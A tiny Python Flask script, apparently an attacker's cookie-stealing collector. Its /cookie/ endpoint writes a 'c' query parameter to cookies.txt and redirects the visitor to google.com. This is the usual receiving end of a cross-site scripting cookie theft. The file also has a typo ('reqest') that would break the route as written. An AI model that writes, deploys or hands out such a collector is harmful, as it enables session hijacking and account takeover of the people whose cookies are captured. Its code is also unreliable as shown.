from flask import Flask, request, redirect
app = Flask(__name__)
print("working\n")

@app.route('/cookie/')
def cookie():
  print("cookie function")
  cookie = reqest.args.get('c')
  f = open("cookies.txt", "a")
  f.write(cookie + ' ' +  '\n')
  f.close()
  return redirect("http://google.com")
  
if __name__ == "__main__":
  app.run(host = '0.0.0.0', port=5000)
